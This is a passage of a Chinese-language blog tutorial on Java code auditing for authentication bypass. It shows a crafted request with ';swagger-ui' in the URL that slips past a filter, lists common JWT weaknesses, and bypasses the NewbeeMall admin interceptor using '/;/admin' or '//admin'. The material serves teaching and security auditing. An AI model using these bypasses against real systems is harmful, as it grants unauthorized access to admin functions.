+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>那么只需要在url中构造处;swagger-ui即可进行绕过</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">accessUser</span><span class="o">/</span><span class="n">pageList</span><span class="p">;</span><span class="n">swagger</span><span class="o">-</span><span class="n">ui</span><span class="o">?</span><span class="n">showMoreSearch</span><span class="o">=</span><span class="kc">false</span><span class="o">&amp;</span><span class="n">pageNumber</span><span class="o">=</span><span class="n">1</span><span class="o">&amp;</span><span class="n">pageSize</span><span class="o">=</span><span class="n">10</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">252</span><span class="p">:</span><span class="n">9095</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">139</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">139</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">,</span><span class="w"> </span><span class="o">*/*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.165.252:9095/index.html</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/18.png"
+	width="2502"
+	height="865"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/18_hu_7d9d3e060d776cc2.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/18_hu_31754bff9926279f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="289"
+		data-flex-basis="694px"
+	
+></p>
+<h2 id="4jwt权限校验问题">4.JWT权限校验问题
+</h2><p><strong>JWT产生的问题有以下几种</strong></p>
+<ul>
+<li><strong><font style="color:#DF2A3F;">1.生成JWT时使用空加密</font></strong></li>
+<li><strong><font style="color:#DF2A3F;">2.服务端未校验签名</font></strong></li>
+<li><strong><font style="color:#DF2A3F;">3.密钥默认未被修改</font></strong></li>
+<li><strong><font style="color:#DF2A3F;">4.密钥过于简单可被爆破</font></strong></li>
+</ul>
+<h3 id="41fastcms-jwt密钥泄露">4.1.Fastcms-JWT密钥泄露
+</h3><p><strong>先查看pom.xml文件，发现网站使用JWT</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/19.png"
+	width="1611"
+	height="998"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/19_hu_dab45b76fdeefa8b.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/19_hu_b3156cb01e922a3d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="161"
+		data-flex-basis="387px"
+	
+></p>
+<p><strong>可以看到登录成功后，发现返回吧返回JWT令牌</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/20.png"
+	width="2474"
+	height="829"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/20_hu_d02f7302432a3137.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/20_hu_beb1728eef7b1261.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="716px"
+	
+></p>
+<p><strong>既然使用了JWT技术，那么最重要的就是查看密钥是否硬编码在代码中，查看配置文件</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/21.png"
+	width="1572"
+	height="871"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/21_hu_a6a557553dc3264d.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/21_hu_df2dbfe8f4940621.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="180"
+		data-flex-basis="433px"
+	
+></p>
+<h2 id="5">5.<strong><font style="color:rgb(254, 44, 36);">Interceptor鉴权审计</font></strong>
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s?__biz=MzkwODYzODc5OA==&amp;mid=2247485192&amp;idx=1&amp;sn=cc236bdc7ecaa4764d984830fbb787c7&amp;chksm=c102ba029c241aa52af065248586c7bc8d97dcfb18534275cc933abd81944b3941b0f90a584d#rd"  target="_blank" rel="noopener"
+    >JAVA 鉴权审计分析</a></p>
+<p><strong>概念：是一种动态拦截方法调用的机制，类似于过滤器。Spring框架中提供的，用来动态拦截控制器方法的执行。</strong></p>
+<p><strong>作用：拦截请求，在指定的方法调用前店，根据业务需要执行预先设定的代码。</strong></p>
+<p><strong>拦截器Interceptor审计和过滤器Filter差不多，拦截器也是需要实现3个方法</strong><code>preHandle，postHandle，afterCompletion</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">cn.edu.interceptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">jakarta.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">jakarta.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.stereotype.Component</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.ModelAndView</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//ctrl+o重写需要的方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Component</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">loginCheckInterceptor</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">HandlerInterceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//目标资源方法运行前运行，返回true，放行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">preHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;preHandle...&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">    </span><span class="c1">//记得返回true，否则什么操作也干不了</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//目标资源方法运行后运行，返回true，放行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">postHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">ModelAndView</span><span class="w"> </span><span class="n">modelAndView</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;postHandle...&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//视图渲染完毕运行，最后运行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">afterCompletion</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;afterCompletion...&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">preHandle</span><span class="err">：</span><span class="n">在controller方法运行前执行</span><span class="err">，</span><span class="n">所已进行校验时需要将方法写在preHandle中</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">postHandle</span><span class="o">&amp;</span><span class="n">afterCompletion</span><span class="err">：</span><span class="n">在controller方法运行后执行</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/22.png"
+	width="1781"
+	height="418"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/22_hu_10f8aaaeaa98f56f.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/22_hu_a7af891def69f57f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="426"
+		data-flex-basis="1022px"
+	
+></p>
+<p><strong>拦截器执行流程</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/23.png"
+	width="1844"
+	height="736"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/23_hu_cefae34c7b41511c.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/23_hu_b9b863f0cff67d26.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="601px"
+	
+></p>
+<h3 id=""><strong><font style="color:rgb(254, 44, 36);">5.1.NewbeeMall电商系统</font></strong>
+</h3><p><strong>先查看pom.xml文件，没有使用专业的权限校验框架，也没有使用Filter过滤器，使用Interceptor拦截器</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">preHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">requestServletPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getServletPath</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">requestServletPath</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&#34;/admin&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;loginUser&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&#34;errorMsg&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;请登陆&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">response</span><span class="p">.</span><span class="na">sendRedirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getContextPath</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;/admin/login&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">removeAttribute</span><span class="p">(</span><span class="s">&#34;errorMsg&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>代码功能</strong>：在请求到达 Controller 前执行，验证用户是否已登录。</li>
+<li><strong>逻辑流程</strong>：</li>
+</ul>
+<ol>
+<li><strong>路径匹配</strong>：检查请求路径是否以 <code>/admin</code> 开头（后台管理路径）。</li>
+<li><strong>会话验证</strong>：通过 <code>request.getSession().getAttribute(&quot;loginUser&quot;)</code> 判断用户是否已登录（<code>loginUser</code> 存储用户会话信息）。</li>
+<li><strong>未登录处理</strong>：
+<ul>
+<li>设置错误信息到 Session：<code>request.getSession().setAttribute(&quot;errorMsg&quot;, &quot;请登陆&quot;)</code>。</li>
+<li>重定向到登录页：<code>response.sendRedirect(...)</code>。</li>
+<li>返回 <code>false</code>，中断后续处理流程。</li>
+</ul>
+</li>
+<li><strong>已登录处理</strong>：清除错误信息（<code>removeAttribute(&quot;errorMsg&quot;)</code>），返回 <code>true</code>，放行请求。</li>
+</ol>
+<p><strong>漏洞利用</strong></p>
+<p><font style="color:rgb(77, 77, 77);">由于 Session 无法伪造，那么可以从 URI 入手，试想若构造一个不以 /admin 开头的 URI，那不就可以放行了吗？于是构造 URI 为 </font><font style="color:rgb(254, 44, 36);">/;/admin</font><font style="color:rgb(77, 77, 77);"> 或 </font><font style="color:rgb(254, 44, 36);">//admin</font><font style="color:rgb(77, 77, 77);">（不影响解析）成功绕过 Interceptor 进入后台。</font></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/24.png"
+	width="2559"
+	height="1528"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/24_hu_c2b3ed8c10378d04.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/24_hu_4a30fb9086c0c049.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="167"
+		data-flex-basis="401px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Sep 26, 2025 22:59 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/logo.cd4bdbc6fb90462cff0e6515d3725588_hu_6614ca894ecd295b.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Java代码审计之SQL注入"
+                        
+                        data-hash="md5-zUvbxvuQRiz/DmUV03JViA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java代码审计之SQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E8%BD%AF%E4%BB%B6%E6%88%90%E5%88%86%E5%88%86%E6%9E%90sca/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E8%BD%AF%E4%BB%B6%E6%88%90%E5%88%86%E5%88%86%E6%9E%90sca/logo.7efcf023502c8c6a726e1bd7b2859dcf_hu_3fcdfa5f36568e51.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 软件成分分析SCA"
+                        
+                        data-hash="md5-fvzwI1AsjGpybhvXsoWdzw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">软件成分分析SCA</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/logo.1eaa7543bc50eaffd5fc10a46ba6c8a8_hu_92266fad7af0c1c2.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Java代码审计模板安全SSTI漏洞"
+                        
+                        data-hash="md5-Hqp1Q7xQ6v/V/BCka6bIqA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java代码审计模板安全SSTI漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/logo.a032b2980eb9a6fcad2e1a5a6a085e82_hu_b8a65311795c358b.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson反序列化"
+                        
+                        data-hash="md5-oDKymA65pvytLhpaaghegg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/log4j.9c2086567b12e85d6f168b96609be169_hu_95a73b7e88de438a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Log4j反序列化"
+                        
+                        data-hash="md5-nCCGVnsS6F1vFouWYJvhaQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Log4j反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
